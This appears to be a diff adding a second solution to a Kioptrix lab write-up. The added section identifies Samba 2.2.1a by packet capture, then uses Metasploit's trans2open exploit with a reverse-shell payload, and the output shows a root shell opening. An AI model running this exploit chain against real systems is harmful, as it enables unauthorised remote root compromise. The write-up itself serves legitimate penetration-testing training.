@@ -261,3 +261,145 @@ uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10
 ```
 
 **Note:** I can't get the ```ptrace-kmod.c``` from default web server in the POC, so I download it manually and host the local web server to get it.
+
+### Solution 2: Samba smbd
+
+As result of Enumeration step, I know that this target is running Samba, but I don't know what version it it. 
+
+Connect to this target:
+
+```
+smbclient -L 172.10.0.222  
+```
+
+```
+Server does not support EXTENDED_SECURITY  but 'client use spnego = yes' and 'client ntlmv2 auth = yes' is set
+Anonymous login successful
+Password for [WORKGROUP\root]:
+
+        Sharename       Type      Comment
+        ---------       ----      -------
+        IPC$            IPC       IPC Service (Samba Server)
+        ADMIN$          IPC       IPC Service (Samba Server)
+Reconnecting with SMB1 for workgroup listing.
+Server does not support EXTENDED_SECURITY  but 'client use spnego = yes' and 'client ntlmv2 auth = yes' is set
+Anonymous login successful
+
+        Server               Comment
+        ---------            -------
+        KIOPTRIX             Samba Server
+
+        Workgroup            Master
+        ---------            -------
+        MYGROUP              KIOPTRIX
+```
+
+Capture this packet via Wireshark and follow TCP Stream to detect what SMB version of target is:
+
+```
+...D DBDHDCCODBDACODACODBDIDJCACACACA. ELEBEMEJCACACACACACACACACACACAAA..........SMBr.....C......................j..MICROSOFT NETWORKS 3.0..LANMAN1.0..LM1.2X002..DOS LANMAN2.1..LANMAN2.1..Samba..NT LANMAN 1.0..NT LM 0.12....U.SMBr...............................2.....................}.
+........j.$..*..MYGROUP....J.SMBs.....C...............Q	....
+........Q	................
+...Unix.Samba....C.SMBs.....................Q	d............Unix.Samba 2.2.1a.MYGROUP....F.SMBu.....C...............Q	d...............\\172.10.0.189\IPC$.?????....1.SMBu.....................Q	d............IPC.IPC....p.SMB%.....C...............Q	d....".................".L...p...1.\PIPE\LANMAN.h.WrLehDz.B16BBDz.........MYGROUP......g.SMB%.....................Q	d...
+..'.....8...'.@.....0..........KIOPTRIX..................Samba Server....p.SMB%.....C...............Q	d....".................".L...p...1.\PIPE\LANMAN.h.WrLehDz.B16BBDz.........MYGROUP........SMB%.....................Q	d...
+..C.....8...C.@.....L..........MYGROUP...............4...WORKGROUP.............=...KIOPTRIX.JIMMY....#.SMBq.....C...............Q	d.........#.SMBq.....................Q	d......
+```
+
+So, the Samba version of this target is 2.2.1a.
+
+Go to exploitdb to get the information of this version:
+
+```
+searchsploit Samba 2.2.1                                                                                                                              1 ⨯
+```
+
+```
+---------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+ Exploit Title                                                                                                              |  Path
+---------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+Samba 2.2.0 < 2.2.8 (OSX) - trans2open Overflow (Metasploit)                                                                | osx/remote/9924.rb
+Samba < 2.2.8 (Linux/BSD) - Remote Code Execution                                                                           | multiple/remote/10.c
+Samba < 3.0.20 - Remote Heap Overflow                                                                                       | linux/remote/7701.txt
+Samba < 3.6.2 (x86) - Denial of Service (PoC)                                                                               | linux_x86/dos/36741.py
+```
+
+The module ```trans2open``` is vulnerable. Using ```metasploit``` to exploit it:
+
+
+```
+msfconsole
+msf6 > search trans2open
+```
+
+```
+Matching Modules
+================
+
+   #  Name                              Disclosure Date  Rank   Check  Description
+   -  ----                              ---------------  ----   -----  -----------
+   0  exploit/freebsd/samba/trans2open  2003-04-07       great  No     Samba trans2open Overflow (*BSD x86)
+   1  exploit/linux/samba/trans2open    2003-04-07       great  No     Samba trans2open Overflow (Linux x86)
+   2  exploit/osx/samba/trans2open      2003-04-07       great  No     Samba trans2open Overflow (Mac OS X PPC)
+   3  exploit/solaris/samba/trans2open  2003-04-07       great  No     Samba trans2open Overflow (Solaris SPARC)
+
+
+Interact with a module by name or index. For example info 3, use 3 or use exploit/solaris/samba/trans2open
+```
+
+```
+msf6 > use 1
+[*] No payload configured, defaulting to linux/x86/meterpreter/reverse_tcp
+msf6 exploit(linux/samba/trans2open) > set payload linux/x86/shell_reverse_tcp
+payload => linux/x86/shell_reverse_tcp
+msf6 exploit(linux/samba/trans2open) > set rhosts 172.10.0.222
+rhosts => 172.10.0.222
+```
+
+Review options:
+
+```
+msf6 exploit(linux/samba/trans2open) > options
+```
+
+```
+Module options (exploit/linux/samba/trans2open):
+
+   Name    Current Setting  Required  Description
+   ----    ---------------  --------  -----------
+   RHOSTS  172.10.0.222     yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
+   RPORT   139              yes       The target port (TCP)
+
+
+Payload options (linux/x86/shell_reverse_tcp):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   CMD    /bin/sh          yes       The command string to execute
+   LHOST  172.10.0.167     yes       The listen address (an interface may be specified)
+   LPORT  4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Samba 2.2.x - Bruteforce
+```
+
+Exploit the target:
+
+```
+msf6 exploit(linux/samba/trans2open) > exploit 
+```
+
+```
+[*] Started reverse TCP handler on 172.10.0.167:4444 
+[*] 172.10.0.189:139 - Trying return address 0xbffffdfc...
+[*] 172.10.0.189:139 - Trying return address 0xbffffcfc...
+[*] Command shell session 1 opened (172.10.0.167:4444 -> 172.10.0.222:1033) at 2022-08-12 00:59:09 -0700
+[*] Command shell session 2 opened (172.10.0.167:4444 -> 172.10.0.222:1034) at 2022-08-12 00:59:10 -0700
+whoami
+root
+id
+uid=0(root) gid=0(root) groups=99(nobody)
+```
